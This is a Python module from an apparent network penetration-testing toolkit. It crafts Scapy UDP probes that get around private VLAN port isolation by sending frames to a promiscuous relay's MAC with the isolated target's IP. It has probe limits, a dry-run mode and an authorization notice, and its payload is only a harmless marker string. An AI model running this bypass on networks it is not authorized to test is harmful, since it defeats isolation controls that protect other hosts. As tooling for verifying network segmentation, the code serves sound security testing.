"""Private VLAN isolation bypass: reach an isolated port through a port that is not isolated.

In a private VLAN, an isolated port may exchange frames only with promiscuous ports, such as
an uplink or a router. Two isolated hosts cannot reach each other directly. A promiscuous
device that routes or relays frames can still carry traffic between them, and that relay
step is the bypass this module sends.

The module sends UDP probes from the operator's interface. With no relay MAC, they go
straight to the target's MAC, which isolation should block. With a relay MAC, they go to the
relay's MAC with the target's IP, so the relay forwards them. The effect to measure is
whether the target receives the probes in each case.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IP, UDP, Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

MAX_PROBES = 100
PROBE_PORT = 4000
PAYLOAD = b"MACabre PVLAN probe"


@dataclass(frozen=True)
class PrivateVlanBypassConfig:
    iface: str                          # the attacker's isolated port
    source_mac: str                     # the attacker's MAC (required)
    source_ip: str                      # the attacker's IPv4 address (required)
    target_mac: str                     # the target's MAC, used for direct probes (required)
    target_ip: str                      # the target's IPv4 address (required)
    relay_mac: str = ""                 # promiscuous relay's MAC; empty = send direct to the target
    probes: int = 1                     # probes to send
    dry_run: bool = False               # build probes but do not send them

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.source_mac)
        normalize_unicast_mac(self.target_mac)
        if self.relay_mac:
            normalize_unicast_mac(self.relay_mac)
        for name, value in (("Source address", self.source_ip), ("Target address", self.target_ip)):
            try:
                ipaddress.IPv4Address(value)
            except ValueError as exc:
                raise ValueError(f"{name} must be an IPv4 address.") from exc
        if not 1 <= self.probes <= MAX_PROBES:
            raise ValueError(f"Probes must be between 1 and {MAX_PROBES}.")


@dataclass
class PrivateVlanBypassStats:
    probes: int = 0
    status: str = ""


def build_probe(config: PrivateVlanBypassConfig) -> Packet:
    """UDP probe to the target's IP, sent to the relay's MAC when one is given, else to the target."""
    dst_mac = normalize_unicast_mac(config.relay_mac) if config.relay_mac else normalize_unicast_mac(config.target_mac)
    return (
        Ether(src=normalize_unicast_mac(config.source_mac), dst=dst_mac)
        / IP(src=config.source_ip, dst=config.target_ip, ttl=64)
        / UDP(sport=PROBE_PORT, dport=PROBE_PORT)
        / Raw(PAYLOAD)
    )


def run_private_vlan_bypass(
    config: PrivateVlanBypassConfig,
    stop_event: threading.Event,
    on_progress: Callable[[PrivateVlanBypassStats], None],
    send: Callable[..., Any] | None = None,
) -> PrivateVlanBypassStats:
    """Send the probes one at a time, unless `stop_event` is set first."""
    send = send or sendp
    route = f"via relay {config.relay_mac}" if config.relay_mac else "direct"

    if config.dry_run:
        stats = PrivateVlanBypassStats(
            status=f"Dry run: would send {config.probes} probe(s) to {config.target_ip} {route}. Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    stats = PrivateVlanBypassStats()
    frame = build_probe(config)
    for _ in range(config.probes):
        if stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.probes += 1
        on_progress(replace(stats))
    return stats
